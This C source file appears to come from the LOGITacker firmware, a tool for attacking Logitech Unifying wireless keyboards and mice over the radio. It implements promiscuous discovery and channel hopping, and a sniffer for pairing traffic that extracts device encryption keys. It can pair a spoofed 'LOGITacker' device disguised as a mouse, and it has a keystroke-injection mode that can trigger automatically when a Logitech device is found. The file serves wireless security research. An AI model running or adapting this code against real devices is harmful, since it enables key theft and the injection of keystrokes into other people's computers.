#include "logitacker.h"
#include "logitacker_bsp.h"
#include "logitacker_radio.h"
#include "logitacker_devices.h"
#include "nrf.h"
#include "nrf_esb_illegalmod.h"
#include "bsp.h"
#include "unifying.h"
#include "helper.h"
#include "app_timer.h"
#include "logitacker_pairing_parser.h"
#include "logitacker_unifying_crypto.h"
#include "logitacker_keyboard_map.h"
#include "logitacker_processor.h"
#include "logitacker_processor_active_enum.h"
#include "logitacker_processor_passive_enum.h"
#include "logitacker_processor_pair_device.h"
#include "logitacker_processor_inject.h"
#include "logitacker_usb.h"
#include "logitacker_options.h"
#include "utf.h"

#define NRF_LOG_MODULE_NAME LOGITACKER
#include "nrf_log.h"
#include "logitacker_flash.h"

NRF_LOG_MODULE_REGISTER();

APP_TIMER_DEF(m_timer_next_tx_action);

static logitacker_processor_t * p_processor = NULL;



typedef struct {
    uint8_t inner_loop_count; // how many successfull transmissions to RF address of current prefix
    uint8_t led_count;
    uint8_t current_rf_address[5];

    uint8_t base_addr[4];
    uint8_t known_prefix;
    uint8_t next_prefix;

    uint8_t tx_delay_ms;

    bool receiver_in_range;
//    logitacker_active_enumeration_phase_t phase;
} logitacker_substate_active_enumeration_t;

typedef struct {
    uint8_t base_addr[4];
    uint8_t known_prefix;
    uint8_t current_channel_index;

    logitacker_devices_unifying_dongle_t devices[NRF_ESB_PIPE_COUNT];
} logitacker_substate_passive_enumeration_t;


typedef struct {
    bool initialized;
    logitacker_mainstate_t   mainstate;
    //logitacker_substate_discovery_t substate_discovery;
    logitacker_substate_passive_enumeration_t substate_passive_enumeration;
    logitacker_substate_active_enumeration_t substate_active_enumeration;

    logitacker_pairing_sniff_on_success_t pairing_sniff_on_success_action; //not only state, persistent config

    bsp_event_callback_t current_bsp_event_handler;
    nrf_esb_event_handler_t current_esb_event_handler;
    radio_event_handler_t current_radio_event_handler;
    app_timer_timeout_handler_t current_timer_event_handler;
} logitacker_state_t;


logitacker_state_t m_state_local;

static char addr_str_buff[LOGITACKER_DEVICE_ADDR_STR_LEN] = {0};
static nrf_esb_payload_t tmp_payload = {0};
static nrf_esb_payload_t tmp_tx_payload = {0};

static bool m_main_event_handler_bsp_long_pushed;

//static uint8_t m_keyboard_report_decryption_buffer[8] = { 0 };

void main_event_handler_timer_next_action(void *p_context);
void main_event_handler_esb(nrf_esb_evt_t *p_event);
void main_event_handler_radio(radio_evt_t const *p_event);
static void main_event_handler_bsp(bsp_event_t ev);


//void logitacker_enter_mode_discovery();
void discovery_event_handler_esb(nrf_esb_evt_t *p_event);
void discovery_event_handler_radio(radio_evt_t const *p_event);
static void discovery_event_handler_bsp(bsp_event_t ev);
void discovery_process_rx();

void pairing_sniff_reset_timer();
void pairing_sniff_assign_addr_to_pipe1(uint8_t const *const rf_address);
void pairing_sniff_disable_pipe1();
void pairing_sniff_event_handler_esb(nrf_esb_evt_t *p_event);
void pairing_sniff_event_handler_timer_next_action(void *p_context);


/* main/master event handler */
void main_event_handler_timer_next_action(void *p_context) {
    if (p_processor != NULL && p_processor->p_timer_handler != NULL) (*p_processor->p_timer_handler)(p_processor, p_context); // call timer handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_timer_event_handler != NULL) m_state_local.current_timer_event_handler(p_context);
}

void main_event_handler_esb(nrf_esb_evt_t *p_event) {
    switch (p_event->evt_id)
    {
        case NRF_ESB_EVENT_TX_SUCCESS:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN TX_SUCCESS");
            break;
        case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN TX_SUCCESS_ACK_PAY");
            break;
        case NRF_ESB_EVENT_TX_FAILED:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN TX_FAILED");
            break;
        case NRF_ESB_EVENT_RX_RECEIVED:
            NRF_LOG_DEBUG("ESB EVENT HANDLER MAIN RX_RECEIVED");
            break;
        default:
            break;
    }

    if (p_processor != NULL && p_processor->p_esb_handler != NULL) (*p_processor->p_esb_handler)(p_processor, p_event); // call ESB handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_esb_event_handler != 0) m_state_local.current_esb_event_handler(p_event);
}

void main_event_handler_radio(radio_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case RADIO_EVENT_NO_RX_TIMEOUT:
        {
            NRF_LOG_DEBUG("RADIO EVENT HANDLER MAIN: RX TIMEOUT");
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
        {
            NRF_LOG_DEBUG("RADIO EVENT HANDLER MAIN: CHANNEL CHANGED FIRST INDEX");
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED:
        {
            NRF_LOG_DEBUG("RADIO EVENT HANDLER MAIN: CHANNEL CHANGED (index %d, channel freq %d)", p_event->channel_index, p_event->channel);
            break;
        }
    }

    if (p_processor != NULL && p_processor->p_radio_handler != NULL) (*p_processor->p_radio_handler)(p_processor, p_event); // call ESB handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_radio_event_handler != 0) m_state_local.current_radio_event_handler(p_event);
}

static void main_event_handler_bsp(bsp_event_t ev)
{
    // runs in interrupt mode
    //helper_log_priority("bsp_event_callback");
    //uint32_t ret;
    switch ((unsigned int)ev)
    {
        case CONCAT_2(BSP_EVENT_KEY_, BTN_TRIGGER_ACTION):
            //Toggle radio back to promiscous mode
            NRF_LOG_INFO("ACTION button pushed");
            bsp_board_led_on(LED_B);
            break;

        case BSP_USER_EVENT_LONG_PRESS_0:
            m_main_event_handler_bsp_long_pushed = true;
            NRF_LOG_INFO("ACTION BUTTON PUSHED LONG");
            break;

        case BSP_USER_EVENT_RELEASE_0:
            if (m_main_event_handler_bsp_long_pushed) {
                m_main_event_handler_bsp_long_pushed = false;
                break; // don't act if there was already a long press event
            }
            NRF_LOG_INFO("ACTION BUTTON RELEASED");
            break;

        default:
            break; // no implementation needed
    }

    if (p_processor != NULL && p_processor->p_bsp_handler != NULL) (*p_processor->p_bsp_handler)(p_processor, ev); // call BSP handler function of p_processor and hand in p_processor (self) as first arg
    if (m_state_local.current_bsp_event_handler != 0) m_state_local.current_bsp_event_handler(ev);
}

/* methods for discovery mode */
void logitacker_enter_mode_discovery() {
    p_processor = NULL;
    NRF_LOG_INFO("Entering discovery mode");

    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping
    nrf_esb_stop_rx(); //stop rx in case running

    m_state_local.mainstate = LOGITACKER_MAINSTATE_DISCOVERY;

    m_state_local.current_bsp_event_handler = discovery_event_handler_bsp;
    m_state_local.current_esb_event_handler = discovery_event_handler_esb; // process RX_RECEIVED
    m_state_local.current_radio_event_handler = discovery_event_handler_radio; //restarts channel hopping on rx timeout
    m_state_local.current_timer_event_handler = NULL;

    bsp_board_leds_off(); //disable all LEDs

    //set radio to promiscuous mode and start RX
    nrf_esb_set_mode(NRF_ESB_MODE_PROMISCOUS); //use promiscuous mode
    nrf_esb_start_rx(); //start rx
    radio_enable_rx_timeout_event(LOGITACKER_DISCOVERY_STAY_ON_CHANNEL_AFTER_RX_MS); //set RX timeout, the eventhandler starts channel hopping once this timeout is reached
}

void discovery_event_handler_esb(nrf_esb_evt_t *p_event) {
    switch (p_event->evt_id) {
        case NRF_ESB_EVENT_RX_RECEIVED:
            NRF_LOG_DEBUG("ESB EVENT HANDLER DISCOVERY RX_RECEIVED");
            discovery_process_rx(); //replace by processing of frames
            break;
        default:
            break;
    }
}

void discovery_event_handler_radio(radio_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case RADIO_EVENT_NO_RX_TIMEOUT:
        {
            NRF_LOG_INFO("Discovery: no RX on current channel for %d ms ... restart channel hopping ...", LOGITACKER_DISCOVERY_STAY_ON_CHANNEL_AFTER_RX_MS);
            radio_start_channel_hopping(LOGITACKER_DISCOVERY_CHANNEL_HOP_INTERVAL_MS, 0, true); //start channel hopping directly (0ms delay) with 30ms hop interval, automatically stop hopping on RX
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
        {
            NRF_LOG_DEBUG("DISCOVERY MODE channel hop reached first channel");
            bsp_board_led_invert(LED_B); // toggle scan LED everytime we jumped through all channels
            break;
        }
        default:
            break;
    }
}

static void discovery_event_handler_bsp(bsp_event_t ev) {
    NRF_LOG_INFO("Discovery BSP event: %d", (unsigned int)ev);
}

void discovery_process_rx() {
    static nrf_esb_payload_t rx_payload;
    static nrf_esb_payload_t * p_rx_payload = &rx_payload;
    while (nrf_esb_read_rx_payload(p_rx_payload) == NRF_SUCCESS) {
        if (p_rx_payload->validated_promiscuous_frame) {
            uint8_t len = p_rx_payload->length;
            uint8_t ch_idx = p_rx_payload->rx_channel_index;
            uint8_t ch = p_rx_payload->rx_channel;
            uint8_t addr[5];
            memcpy(addr, &p_rx_payload->data[2], 5);

            uint8_t prefix;
            uint8_t base[4];
            helper_addr_to_base_and_prefix(base, &prefix, addr, 5); //convert device addr to base+prefix and update device

            helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, addr);
            NRF_LOG_INFO("DISCOVERY: received valid ESB frame (addr %s, len: %d, ch idx %d, raw ch %d)", addr_str_buff, len, ch_idx, ch);
           
            NRF_LOG_HEXDUMP_DEBUG(p_rx_payload->data, p_rx_payload->length);

            logitacker_devices_unifying_device_t *p_device = NULL;
            logitacker_devices_create_device(&p_device, addr);

            // update device counters
            //bool isLogitech = false;
            if (p_device != NULL) {
                // convert promisuous mode frame to default ESB frame
                logitacker_radio_convert_promiscuous_frame_to_default_frame(&tmp_payload, rx_payload);

                // classify device (determin if it is Logitech)
                logitacker_devices_device_update_classification(p_device, tmp_payload);
                if (p_device->p_dongle != NULL) {
                    if (p_device->p_dongle->classification == DONGLE_CLASSIFICATION_IS_LOGITECH) {
                        NRF_LOG_INFO("discovered device is Logitech")
                        switch (g_logitacker_global_config.discovery_on_new_address_action) {
                            case LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_DO_NOTHING:
                                break;
                            case LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_SWITCH_ACTIVE_ENUMERATION:
                                logitacker_enter_mode_active_enum(addr);
                                break;
                            case LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_SWITCH_PASSIVE_ENUMERATION:
                                logitacker_enter_mode_passive_enum(addr);
                                break;
                            case LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_SWITCH_AUTO_INJECTION:
                                logitacker_enter_mode_injection(addr);
                                logitacker_injection_string(LANGUAGE_LAYOUT_US, LOGITACKER_AUTO_INJECTION_PAYLOAD);
                                break;
                            default:
                                // do nothing, stay in discovery
                                break;
                        }
                    } else if (p_device->p_dongle->classification == DONGLE_CLASSIFICATION_IS_NOT_LOGITECH) {
                        NRF_LOG_INFO("Discovered device doesn't seem to be Logitech, removing from list again...");
                        NRF_LOG_HEXDUMP_INFO(tmp_payload.data, tmp_payload.length);
                        if (p_device != NULL) logitacker_devices_del_device(p_device->rf_address);
                    } else {
                        NRF_LOG_INFO("discovered device not classified, yet. Likely because RX frame was empty ... removing device from list")
                        if (p_device != NULL) logitacker_devices_del_device(p_device->rf_address);
                    }
                }
            }

        } else {
            NRF_LOG_WARNING("invalid promiscuous frame in discovery mode, shouldn't happen because of filtering");
        }

    }

}

bool m_pair_sniff_data_rx = false;
uint32_t m_pair_sniff_ticks = APP_TIMER_TICKS(8);
uint32_t m_pair_sniff_ticks_long = APP_TIMER_TICKS(20);
bool m_pair_sniff_dongle_in_range = false;
static logitacker_pairing_info_t m_device_pair_info;


void pairing_sniff_reset_timer() {
    app_timer_stop(m_timer_next_tx_action);
    if (m_pair_sniff_data_rx) {
        app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks_long, NULL);
        m_pair_sniff_data_rx = false;
    } else {
        app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL);
    }
}

void pairing_sniff_assign_addr_to_pipe1(uint8_t const *const rf_address) {
    uint8_t base[4] = { 0 };
    uint8_t prefix = 0;
    helper_addr_to_base_and_prefix(base, &prefix, rf_address, 5);

    //stop time to prevent rewriting payloads
    app_timer_stop(m_timer_next_tx_action);
    while (nrf_esb_stop_rx() != NRF_SUCCESS) {}
    nrf_esb_set_base_address_1(base);
    nrf_esb_update_prefix(1, prefix);
    nrf_esb_enable_pipes(0x03);
    nrf_esb_start_rx();
    app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL); // restart timer
}

void pairing_sniff_disable_pipe1() {
    //stop time to prevent rewriting payloads
    app_timer_stop(m_timer_next_tx_action);
    while (nrf_esb_stop_rx() != NRF_SUCCESS) {}
    nrf_esb_enable_pipes(0x01);
    app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL); // restart timer
}

void pairing_sniff_on_success() {
    switch (m_state_local.pairing_sniff_on_success_action) {
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_CONTINUE:
            NRF_LOG_INFO("Continue to sniff pairing");
            return;
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_DISCOVERY:
            NRF_LOG_INFO("Sniffed full pairing, changing back to discover mode");
            app_timer_stop(m_timer_next_tx_action);
            logitacker_enter_mode_discovery();
            break;
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_ACTIVE_ENUMERATION:
            app_timer_stop(m_timer_next_tx_action);
            helper_addr_to_hex_str(addr_str_buff, 5, m_device_pair_info.device_rf_address);
            NRF_LOG_INFO("Sniffed full pairing, moving on with active enumeration for %s", nrf_log_push(addr_str_buff));
            logitacker_enter_mode_active_enum(m_device_pair_info.device_rf_address);
            break;
        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION:
            app_timer_stop(m_timer_next_tx_action);
            helper_addr_to_hex_str(addr_str_buff, 5, m_device_pair_info.device_rf_address);
            NRF_LOG_INFO("Sniffed full pairing, moving on with passive enumeration for %s", nrf_log_push(addr_str_buff));
            logitacker_enter_mode_passive_enum(m_device_pair_info.device_rf_address);
            break;
        default:
            break;
    }
}

void pairing_sniff_event_handler_esb(nrf_esb_evt_t *p_event) {
    uint32_t freq;
    nrf_esb_get_rf_frequency(&freq);

    switch (p_event->evt_id) {
        // happens when PTX_stay_RX is in sub state PRX and receives data
        case NRF_ESB_EVENT_RX_RECEIVED:
        case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
            // we received data
            NRF_LOG_INFO("PAIR SNIFF data received on channel %d", freq);
            while (nrf_esb_read_rx_payload(&tmp_payload) == NRF_SUCCESS) {
                m_pair_sniff_data_rx = true;
                NRF_LOG_HEXDUMP_INFO(tmp_payload.data, tmp_payload.length);

                // check if pairing response phase 1, with new address
                if (tmp_payload.length == 22 && tmp_payload.data[1] == 0x1f && tmp_payload.data[2] == 0x01) {
                    /*
                     * <info> LOGITACKER:  BC 1F 01 BD BA 92 24 27|......$'
                     * <info> LOGITACKER:  08 88 08 04 01 01 07 00|........
                     * <info> LOGITACKER:  00 00 00 00 00 2B
                     */

                    uint8_t new_address[LOGITACKER_DEVICE_ADDR_LEN] = { 0 };
                    memcpy(new_address, &tmp_payload.data[3], LOGITACKER_DEVICE_ADDR_LEN);
                    pairing_sniff_assign_addr_to_pipe1(new_address);

                    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, new_address);
                    NRF_LOG_INFO("PAIR SNIFF assigned %s as new sniffing address", addr_str_buff);
                }

                // clear pairing info when new pairing request 1 is spotted
                if (tmp_payload.length == 22 && tmp_payload.data[1] == 0x5f && tmp_payload.data[2] == 0x01) {
                    memset(&m_device_pair_info, 0, sizeof(m_device_pair_info));
                }

                // parse pairing data
                if (logitacker_pairing_parser(&m_device_pair_info, &tmp_payload) == NRF_SUCCESS) {
                    // full pairing parsed (no frames missing)
                    pairing_sniff_disable_pipe1();

                    //retrieve device or add new and update data
                    logitacker_devices_unifying_device_t * p_device = NULL;
                    logitacker_devices_get_device(&p_device, m_device_pair_info.device_rf_address);
                    if (p_device == NULL) {
                        //couldn't fetch device, try to create
                        logitacker_devices_create_device(&p_device, m_device_pair_info.device_rf_address);
                    }
                    if (p_device == NULL) {
                        NRF_LOG_ERROR("failed adding device entry for pairing sniff result");
                    } else {
                        // update device caps
                        memcpy(p_device->serial, m_device_pair_info.device_serial, 4);
                        memcpy(p_device->device_name, m_device_pair_info.device_name, m_device_pair_info.device_name_len);
                        memcpy(p_device->key, m_device_pair_info.device_key, 16);
                        memcpy(p_device->raw_key_data, m_device_pair_info.device_raw_key_material, 16);
                        memcpy(p_device->rf_address, m_device_pair_info.device_rf_address, 16);
                        memcpy(p_device->wpid, m_device_pair_info.device_wpid, 2);
                        if (p_device->p_dongle == NULL) {
                            NRF_LOG_ERROR("device doesn't point to dongle");
                        } else {
                            memcpy(p_device->p_dongle->wpid, m_device_pair_info.dongle_wpid, 2);
                        }
                        p_device->key_known = m_device_pair_info.key_material_complete;
                    }

                    pairing_sniff_on_success();
                }
            }
            pairing_sniff_reset_timer();
            break;
        case NRF_ESB_EVENT_TX_SUCCESS:
        {
            // we hit the dongle, but no data was received on the channel so far, we start a timer for ping re-transmission
            if (!m_pair_sniff_dongle_in_range) {
                NRF_LOG_INFO("Spotted dongle in pairing mode, follow while channel hopping");
                m_pair_sniff_dongle_in_range = true;
            }
            NRF_LOG_INFO("dongle on channel %d ", freq);
            pairing_sniff_reset_timer();
            break;
        }
        case NRF_ESB_EVENT_TX_FAILED:
        {
            // missed dongle, re-transmit ping payload

            if (m_pair_sniff_dongle_in_range) {
                // if dongle was in range before, notify tha we lost track
                NRF_LOG_INFO("Lost dongle in pairing mode, restart channel hopping");
                m_pair_sniff_dongle_in_range = false;
            }

            NRF_LOG_DEBUG("TX_FAILED on all channels, retry %d ...", freq);
            // write payload again and start rx
            nrf_esb_start_tx();
        }
        default:
            break;
    }
}


// Transfers execution to active_enum_process_sub_event
void pairing_sniff_event_handler_timer_next_action(void *p_context) {
        // if we haven't received data after last ping, ping again
    //NRF_LOG_INFO("re-ping");
        nrf_esb_flush_tx();
        nrf_esb_write_payload(&tmp_tx_payload);
}



// Transfers execution to active_enum_process_sub_event
void logitacker_enter_mode_passive_enum(uint8_t *rf_address) {
    if (p_processor != NULL && p_processor->p_deinit_func != NULL) (*p_processor->p_deinit_func)(p_processor);
    p_processor = new_processor_passive_enum(rf_address);
    p_processor->p_init_func(p_processor);


    m_state_local.current_bsp_event_handler = NULL;
    m_state_local.current_radio_event_handler = NULL;
    m_state_local.current_esb_event_handler = NULL;
    m_state_local.current_timer_event_handler = NULL;

}


void logitacker_enter_mode_pairing_sniff() {
    if (p_processor != NULL && p_processor->p_deinit_func != NULL) (*p_processor->p_deinit_func)(p_processor);
    p_processor = NULL;

    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, UNIFYING_GLOBAL_PAIRING_ADDRESS);
    uint8_t base_addr[4] = { 0 };
    uint8_t prefix = 0;
    helper_addr_to_base_and_prefix(base_addr, &prefix, UNIFYING_GLOBAL_PAIRING_ADDRESS, 5);

    NRF_LOG_INFO("Sniff pairing on address %s", addr_str_buff);

    
    radio_disable_rx_timeout_event(); // disable RX timeouts
    radio_stop_channel_hopping(); // disable channel hopping
    nrf_esb_stop_rx(); //stop rx in case running

    m_state_local.mainstate = LOGITACKER_MAINSTATE_SNIFF_PAIRING;
    m_state_local.current_bsp_event_handler = NULL;
    m_state_local.current_radio_event_handler = NULL;
    m_state_local.current_esb_event_handler = pairing_sniff_event_handler_esb;
    m_state_local.current_timer_event_handler = pairing_sniff_event_handler_timer_next_action;
    m_state_local.pairing_sniff_on_success_action = LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION;

    
    bsp_board_leds_off(); //disable all LEDs

    uint32_t res = 0;    
    res = nrf_esb_set_mode(NRF_ESB_MODE_SNIFF);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_mode SNIFF: %d", res);
    res = nrf_esb_set_base_address_0(base_addr); // set base addr1
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);



    // add global pairing address to pipe 0
    res = nrf_esb_set_base_address_0(base_addr);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);
    res = nrf_esb_update_prefix(0, prefix);
    if (res != NRF_SUCCESS) NRF_LOG_ERROR("update prefix 0: %d", res);

    nrf_esb_enable_pipes(0x01); //enable only pipe 0

    // prepare ping payload
    tmp_tx_payload.length = 1;
    tmp_tx_payload.data[0] = 0x00; // no valid unifying payload, but ack'ed on ESB radio layer
    tmp_tx_payload.pipe = 0; // pipe with global pairing address assigned
    tmp_tx_payload.noack = false; // we need an ack

    // setup radio as PTX
    nrf_esb_set_mode(NRF_ESB_MODE_PTX_STAY_RX);
    nrf_esb_enable_all_channel_tx_failover(true); //retransmit payloads on all channels if transmission fails
    nrf_esb_set_all_channel_tx_failover_loop_count(4); //iterate over channels two times before failing

    m_state_local.mainstate = LOGITACKER_MAINSTATE_SNIFF_PAIRING;

    // use special channel lookup table for pairing mode
    nrf_esb_update_channel_frequency_table_unifying_pairing();

    // write payload (autostart TX is enabled for PTX mode)
    nrf_esb_write_payload(&tmp_tx_payload);
    app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL);
}


void logitacker_enter_mode_active_enum(uint8_t *rf_address) {
    if (p_processor != NULL && p_processor->p_deinit_func != NULL) (*p_processor->p_deinit_func)(p_processor);

    p_processor = new_processor_active_enum(rf_address, m_timer_next_tx_action);
    p_processor->p_init_func(p_processor);

    m_state_local.current_bsp_event_handler = NULL;
    m_state_local.current_radio_event_handler = NULL;
    m_state_local.current_esb_event_handler = NULL;
    m_state_local.current_timer_event_handler = NULL;

    m_state_local.mainstate = LOGITACKER_MAINSTATE_ACTIVE_ENUMERATION;
}

static uint8_t temp_dev_id = 1;
void logitacker_enter_mode_pair_device(uint8_t const *rf_address) {
    if (p_processor != NULL && p_processor->p_deinit_func != NULL) (*p_processor->p_deinit_func)(p_processor);

    char dev_name[] = "LOGITacker";
    logitacker_pairing_info_t pi = {
            .device_name_len = sizeof(dev_name),
            .device_usability_info = LOGITACKER_DEVICE_USABILITY_INFO_PS_LOCATION_OTHER,
            .device_nonce = {0x011, 0x22, 0x33, 0x44},
            .device_report_types = LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD |
                    LOGITACKER_DEVICE_REPORT_TYPES_POWER_KEYS |
                    LOGITACKER_DEVICE_REPORT_TYPES_MULTIMEDIA |
                    LOGITACKER_DEVICE_REPORT_TYPES_MEDIA_CENTER |
                    LOGITACKER_DEVICE_REPORT_TYPES_MOUSE |
                    LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD_LED |
                    LOGITACKER_DEVICE_REPORT_TYPES_SHORT_HIDPP |
                    LOGITACKER_DEVICE_REPORT_TYPES_LONG_HIDPP,
//            .device_serial = { 0xde, 0xad, 0x13, 0x37 },
            .device_serial = { 0xde, 0xad, 0x13, temp_dev_id++ },
            .device_caps = LOGITACKER_DEVICE_CAPS_UNIFYING_COMPATIBLE, // no link encryption (we could enable and calculate keys if we like)
            .device_type = LOGITACKER_DEVICE_UNIFYING_TYPE_MOUSE, // of course this is shown as a mouse in Unifying software
            .device_wpid = { 0x04, 0x02 }, // random
    };
    memcpy(pi.device_name, dev_name, pi.device_name_len);

    p_processor = new_processor_pair_device(rf_address, &pi, m_timer_next_tx_action);
    p_processor->p_init_func(p_processor);

    m_state_local.current_bsp_event_handler = NULL;
    m_state_local.current_radio_event_handler = NULL;
    m_state_local.current_esb_event_handler = NULL;
    m_state_local.current_timer_event_handler = NULL;

    m_state_local.mainstate = LOGITACKER_MAINSTATE_PAIR_DEVICE;
}

void logitacker_enter_mode_injection(uint8_t const *rf_address) {
    if (p_processor != NULL && p_processor->p_deinit_func != NULL) (*p_processor->p_deinit_func)(p_processor);

    p_processor = new_processor_inject(rf_address, m_timer_next_tx_action);
    p_processor->p_init_func(p_processor);

    m_state_local.current_bsp_event_handler = NULL;
    m_state_local.current_radio_event_handler = NULL;
    m_state_local.current_esb_event_handler = NULL;
    m_state_local.current_timer_event_handler = NULL;

    m_state_local.mainstate = LOGITACKER_MAINSTATE_INJECT;
}

void logitacker_injection_string(logitacker_keyboard_map_lang_t language_layout, char * str) {
    if (m_state_local.mainstate != LOGITACKER_MAINSTATE_INJECT) {
        NRF_LOG_ERROR("Can't inject while not in injection mode");
        return;
    }

    logitacker_processor_inject_string(p_processor, language_layout, str);
}

void logitacker_injection_delay(uint32_t delay_ms) {
    if (m_state_local.mainstate != LOGITACKER_MAINSTATE_INJECT) {
        NRF_LOG_ERROR("Can't inject while not in injection mode");
        return;
    }

    logitacker_processor_inject_delay(p_processor, delay_ms);
}

void clocks_start( void )
{
    NRF_CLOCK->EVENTS_HFCLKSTARTED = 0;
    NRF_CLOCK->TASKS_HFCLKSTART = 1;

    while (NRF_CLOCK->EVENTS_HFCLKSTARTED == 0);
}


uint32_t logitacker_init() {
    logitacker_flash_init();
    logitacker_options_restore_from_flash(); // try to restore options from flash (updates stats like boot count)
    logitacker_options_store_to_flash(); // store back updated options


    clocks_start(); // HF clock needed by ESB radio part

    app_timer_create(&m_timer_next_tx_action, APP_TIMER_MODE_SINGLE_SHOT, main_event_handler_timer_next_action);

    //m_state_local.substate_discovery.on_new_address_action = LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_SWITCH_PASSIVE_ENUMERATION;
    logitacker_bsp_init(main_event_handler_bsp);
    logitacker_usb_init();
    logitacker_radio_init(main_event_handler_esb, main_event_handler_radio);
    logitacker_enter_mode_discovery();


    return NRF_SUCCESS;
}
